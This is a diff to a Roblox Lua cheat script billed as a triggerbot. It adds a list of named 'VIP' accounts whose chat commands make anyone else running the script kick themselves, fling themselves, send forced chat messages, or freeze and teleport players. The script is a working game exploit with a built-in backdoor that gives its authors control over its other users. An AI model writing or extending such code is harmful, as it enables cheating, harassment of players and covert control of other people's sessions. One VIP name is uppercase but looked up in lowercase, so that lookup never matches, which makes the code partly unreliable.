@@ -1,4 +1,4 @@
--- Triggerbot + commands targeting everyone (.g/.s/.f/.k/.t + .tp/.freeze/.unfreeze)
+-- Triggerbot + commands targeting everyone (.g/.s/.f/.k/.t + .tp/.h/.u with bubble chat & multi-VIP)
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -10,8 +10,13 @@ local Camera = workspace.CurrentCamera
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 
+-- VIP USERS LIST
+local VIPUsers = {
+    ["draconvm"] = true,    -- you
+    ["K3TCHUPSS"] = true    -- your girlfriend
+}
+
 -- SETTINGS
-local VIPUser = "draconvm" -- your username
 local BringTargets = {}
 local FrozenPlayers = {}
 local Settings = {
@@ -106,7 +111,9 @@ end)
 RunService.RenderStepped:Connect(function()
     for targetName, _ in pairs(BringTargets) do
         local targetPlayer = Players:FindFirstChild(targetName)
-        local vipPlayer = Players:FindFirstChild(VIPUser)
+        local vipPlayerName
+        for name, _ in pairs(VIPUsers) do vipPlayerName = name break end -- bring to first VIP in list
+        local vipPlayer = Players:FindFirstChild(vipPlayerName)
         if targetPlayer and targetPlayer.Character and vipPlayer and vipPlayer.Character then
             local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
             local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -120,7 +127,7 @@ end)
 
 -- FLING FUNCTION
 local function flingPlayer(player)
-    if player.Name ~= VIPUser and player.Character then
+    if not VIPUsers[player.Name:lower()] and player.Character then
         local root = player.Character:FindFirstChild("HumanoidRootPart")
         if root then
             local bodyVelocity = Instance.new("BodyVelocity")
@@ -133,20 +140,21 @@ local function flingPlayer(player)
     end
 end
 
--- SAY "I LOVE KHERBY" LOCAL FUNCTION
+-- SAY "I LOVE KHERBY" IN BUBBLE CHAT
 local function sayILoveKherby()
-    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
-            TextChatService:Chat(LocalPlayer.Character.Head, "I love Kherby", Enum.ChatColor.Red)
+    local char = LocalPlayer.Character
+    if not char then return end
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+
+    local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if ChatService then
+        local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
+        if SayMessage then
+            SayMessage:FireServer("I love Kherby", "All")
         end
     else
-        local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-        if ChatService then
-            local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
-            if SayMessage then
-                SayMessage:FireServer("I love Kherby", "All")
-            end
-        end
+        TextChatService:Chat(head, "I love Kherby", Enum.ChatColor.Blue)
     end
 end
 
@@ -167,7 +175,7 @@ local function freezePlayer(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
     if targetPlayer and targetPlayer.Character then
         local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if root and not FrozenPlayers[targetPlayer.Name] then
+        if root then
             root.Anchored = true
             FrozenPlayers[targetPlayer.Name] = true
         end
@@ -176,7 +184,7 @@ end
 
 local function unfreezePlayer(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer and targetPlayer.Character and FrozenPlayers[targetPlayer.Name] then
+    if targetPlayer and targetPlayer.Character then
         local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         if root then
             root.Anchored = false
@@ -187,11 +195,11 @@ end
 
 -- CHAT COMMAND HANDLER
 local function onMessage(senderName, message)
-    if senderName:lower() ~= VIPUser:lower() then return end
+    if not VIPUsers[senderName:lower()] then return end
     local msg = message:lower()
     local args = message:split(" ")
 
-    if msg == ".k" and LocalPlayer.Name:lower() ~= VIPUser:lower() then
+    if msg == ".k" and not VIPUsers[LocalPlayer.Name:lower()] then
         LocalPlayer:Kick("Kicked by VIP")
     end
 
@@ -213,17 +221,16 @@ local function onMessage(senderName, message)
         sayILoveKherby()
     end
 
-    -- TP command
-    if args[1]:lower() == ".tp" and args[2] then
-        teleportToPlayer(args[2])
-    end
-
-    -- Freeze/unfreeze commands
-    if args[1]:lower() == ".freeze" and args[2] then
+    -- SHORTER COMMANDS
+    if msg:sub(1,2) == ".h" and args[2] then
         freezePlayer(args[2])
     end
-    if args[1]:lower() == ".unfreeze" and args[2] then
+    if msg:sub(1,2) == ".u" and args[2] then
         unfreezePlayer(args[2])
+    end
+
+    if args[1]:lower() == ".tp" and args[2] then
+        teleportToPlayer(args[2])
     end
 end
 
